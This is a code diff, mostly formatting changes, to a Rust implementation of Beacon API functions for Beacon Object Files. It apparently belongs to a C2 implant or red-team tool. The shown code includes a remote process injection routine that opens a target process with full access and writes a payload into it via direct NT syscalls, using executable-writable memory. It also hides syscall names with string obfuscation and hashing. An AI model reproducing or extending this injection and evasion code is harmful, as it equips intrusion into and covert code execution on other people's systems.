@@ -10,21 +10,17 @@ use core::{
     ptr::{self, null_mut},
 };
 
-use spin::Mutex;
+use dinvk::{hash::jenkins3, types::OBJECT_ATTRIBUTES};
+use dinvk::{syscall, winapis::NtCurrentProcess};
 use obfstr::obfstr as s;
-use dinvk::{winapis::NtCurrentProcess, syscall};
-use dinvk::{types::OBJECT_ATTRIBUTES, hash::jenkins3};
+use spin::Mutex;
 use windows_sys::Win32::{
-    Security::*,
     Foundation::{CloseHandle, HANDLE, STATUS_SUCCESS},
+    Security::*,
     System::{
+        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
         Threading::*,
         WindowsProgramming::CLIENT_ID,
-        Memory::{
-            MEM_COMMIT, 
-            MEM_RESERVE, 
-            PAGE_EXECUTE_READWRITE
-        },
     },
 };
 
@@ -283,7 +279,8 @@ fn beacon_format_free(format: *mut Format) {
 
     unsafe {
         if !(*format).original.is_null() {
-            let layout_result = Layout::from_size_align((*format).size as usize, Layout::new::<i8>().align());
+            let layout_result =
+                Layout::from_size_align((*format).size as usize, Layout::new::<i8>().align());
             if let Ok(layout) = layout_result {
                 alloc::alloc::dealloc((*format).original as *mut u8, layout);
                 (*format).original = null_mut();
@@ -309,7 +306,11 @@ unsafe extern "C" fn beacon_formt_printf(format: *mut Format, fmt: *const c_char
     let fmt_str = CStr::from_ptr(fmt).to_str().unwrap_or("");
     let mut temp_str = String::new();
 
-    printf_compat::format(fmt_str.as_ptr().cast(), args.as_va_list(), printf_compat::output::fmt_write(&mut temp_str));
+    printf_compat::format(
+        fmt_str.as_ptr().cast(),
+        args,
+        printf_compat::output::fmt_write(&mut temp_str),
+    );
 
     let length_needed = temp_str.len() as c_int;
     if (*format).length + length_needed >= (*format).size {
@@ -436,7 +437,7 @@ fn beacon_output(_type: c_int, data: *mut c_char, len: c_int) {
 #[unsafe(no_mangle)]
 unsafe extern "C" fn beacon_printf(_type: c_int, fmt: *mut c_char, mut args: ...) {
     let mut str = String::new();
-    printf_compat::format(fmt, args.as_va_list(), printf_compat::output::fmt_write(&mut str));
+    printf_compat::format(fmt, args, printf_compat::output::fmt_write(&mut str));
     str.push('\0');
 
     let mut buffer = BEACON_BUFFER.lock();
@@ -536,13 +537,13 @@ fn to_wide_char(src: *const c_char, dst: *mut u16, max: c_int) -> c_int {
 
 /// Performs remote process injection into a target process via NT syscalls.
 fn beacon_inject_process(
-    _h_process: HANDLE, 
-    pid: c_int, 
-    payload: *const c_char, 
-    len: c_int, 
-    _offset: c_char, 
-    _arg: *const c_char, 
-    _a_len: c_int
+    _h_process: HANDLE,
+    pid: c_int,
+    payload: *const c_char,
+    len: c_int,
+    _offset: c_char,
+    _arg: *const c_char,
+    _a_len: c_int,
 ) {
     if payload.is_null() || len <= 0 {
         return;
@@ -556,7 +557,13 @@ fn beacon_inject_process(
         };
 
         let mut h_process = null_mut::<c_void>();
-        let status = syscall!(s!("NtOpenProcess"), &mut h_process, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
+        let status = syscall!(
+            s!("NtOpenProcess"),
+            &mut h_process,
+            PROCESS_ALL_ACCESS,
+            &mut oa,
+            &mut ci
+        );
         if status != Some(STATUS_SUCCESS) {
             return;
         }
@@ -579,7 +586,14 @@ fn beacon_inject_process(
         }
 
         let mut now = 0usize;
-        status = syscall!(s!("NtWriteVirtualMemory"), h_process, address, payload as *const c_void, len as usize, &mut now);
+        status = syscall!(
+            s!("NtWriteVirtualMemory"),
+            h_process,
+            address,
+            payload as *const c_void,
+            len as usize,
+            &mut now
+        );
         if status != Some(STATUS_SUCCESS) {
             CloseHandle(h_process);
             return;
@@ -643,10 +657,10 @@ fn beacon_inject_temporary_process(
 
 /// Leaving this to be implemented by people needing/wanting it
 fn beacon_spawn_temporary_process(
-    _x86: i32, 
-    _ignore_token: i32, 
-    _s_info: *mut STARTUPINFOA, 
-    _p_info: *mut PROCESS_INFORMATION
+    _x86: i32,
+    _ignore_token: i32,
+    _s_info: *mut STARTUPINFOA,
+    _p_info: *mut PROCESS_INFORMATION,
 ) {
     unimplemented!()
 }
